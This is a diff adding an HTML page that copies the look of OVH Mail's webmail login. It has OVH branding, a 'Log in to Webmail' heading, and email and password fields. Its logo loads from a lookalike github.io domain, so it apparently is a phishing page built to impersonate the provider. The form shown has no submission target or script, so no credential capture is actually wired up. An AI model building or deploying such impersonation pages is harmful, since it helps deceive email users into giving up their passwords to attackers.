@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Custom Page</title>
+  <style>
+    /* General page styling */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom left, #5f75cb, #000e9b);
+      height: 100vh;
+    }
+
+    /* Top bar styling */
+    .top-bar {
+      background-color: #000e9b;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      color: white;
+      font-size: 16px;
+    }
+
+    /* Container for links */
+    .top-bar div {
+      display: flex;
+      gap: 30px; /* Increased space between menu items */
+    }
+
+    /* Styling for individual links */
+    .top-bar div a {
+      text-decoration: none;
+      color: white;
+    }
+
+    /* Vertical line between "My customer account" and "Contact Sales" */
+    .top-bar div a:first-child {
+      padding-right: 20px; /* Add some space after the first item */
+    }
+
+    .top-bar div a:nth-child(2) {
+      border-left: 2px solid white; /* Vertical line between 1st and 2nd items */
+      padding-left: 20px; /* Add space after the vertical line */
+    }
+
+    /* Sub tab styling */
+    .sub-tab {
+      background-color: #ffffff;
+      height: 60px;
+      text-align: center;
+      line-height: 60px;
+      font-size: 24px;
+      color: #333;
+    }
+
+    /* OVH Mail logo in the top bar */
+    .ovh-logo {
+      height: 30px; /* Adjust the height of the logo */
+    }
+
+    /* OVH Mail text below the sub-tab */
+    .ovh-mail-text {
+      text-align: left;
+      color: white;
+      font-size: 18px;
+      margin-left: 50px;
+      margin-top: 10px;
+    }
+
+    /* White line under OVH mail */
+    .white-line {
+      border-top: 2px solid white;
+      margin: 10px 0;
+      width: calc(100% - 100px);
+      margin-left: 50px;
+      margin-right: 50px;
+    }
+
+    /* Page Heading */
+    .page-heading {
+      text-align: left;
+      font-size: 36px;
+      color: white;
+      margin-left: 50px;
+      margin-top: 20px; /* Space below the white line */
+    }
+
+    /* Login form styling */
+    .login-form-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 200px); /* Leaves space for the bars */
+    }
+
+    .login-form {
+      padding: 30px;
+      border-radius: 10px;
+      width: 350px; /* Increased width of the form */
+    }
+
+    .login-form .input-label {
+      color: white;
+      font-size: 16px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 15px; /* Increased padding for a taller input */
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+      background-color: #5F75CB; /* Background color for input fields */
+      color: white; /* White text for contrast */
+    }
+
+    .login-form input[type="checkbox"] {
+      margin-right: -150px; /* Reduced margin to bring checkbox and label closer */
+      margin-left: -160px;
+    }
+
+    /* Button Styling: White background and blue text, bold font */
+    .login-form button {
+      width: auto; /* Keeps the button width as is */
+      padding: 15px;
+      background-color: white;
+      color: #000e9b; /* Blue text */
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold; /* Make the text bold */
+      margin: 20px auto 0; /* Centers the button */
+      display: block; /* Ensures the button is a block-level element */
+    }
+
+    .login-form button:hover {
+      background-color: #f0f0f0; /* Lighter background on hover */
+    }
+
+    .login-form .checkbox-container {
+      display: flex;
+      align-items: left;
+      color: white;
+      font-size: 16px;
+    }
+     
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      /* Hide the top bar text links on small screens */
+      .top-bar div a {
+        visibility: hidden; /* This will hide the links but still preserve their space */
+      }
+
+      /* Adjustments for the logo in mobile view */
+      .top-bar {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 10px;
+      }
+
+      .top-bar div {
+        flex-direction: column;
+        gap: 15px;
+      }
+
+      .page-heading {
+        font-size: 28px;
+      }
+
+      /* Responsive form adjustments */
+      .login-form {
+        width: 100%;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top bar -->
+  <div class="top-bar">
+    <!-- OVH Mail Logo in top bar -->
+    <img class="ovh-logo" src="https://ovhcloud-co.github.io/logo.png" alt="OVH Cloud Logo">
+    <!-- Links in the top bar -->
+    <div>
+      <a href="#">My customer account</a>
+      <a href="#">Contact Sales</a>
+      <a href="#">Webmail</a>
+      <a href="#">Support</a>
+      <a href="#">Communities</a>
+      <a href="#">Learn</a>
+    </div>
+  </div>
+
+  <!-- Sub tab -->
+  <div class="sub-tab">
+   
+  </div>
+
+  <!-- OVH Mail Text below the sub-tab -->
+  <div class="ovh-mail-text">
+    OVH mail
+  </div>
+
+  <!-- White line -->
+  <div class="white-line"></div>
+
+  <!-- Page heading -->
+  <div class="page-heading">
+    Log in to Webmail
+  </div>
+
+  <!-- Login form -->
+  <div class="login-form-container">
+    <form class="login-form">
+      <!-- Email Field -->
+      <label class="input-label" for="email">Your email</label>
+      <input type="email" id="email" placeholder="" required>
+
+      <!-- Password Field -->
+      <label class="input-label" for="password">Password</label>
+      <input type="password" id="password" placeholder="" required>
+
+      <!-- Remember Me Checkbox -->
+      <div class="checkbox-container">
+        <input type="checkbox" id="remember" />
+        <label for="remember">Remember this address</label>
+      </div>
+
+      <!-- Login Button -->
+      <button type="submit">Send</button>
+    </form>
+  </div>
+
+</body>
+</html>
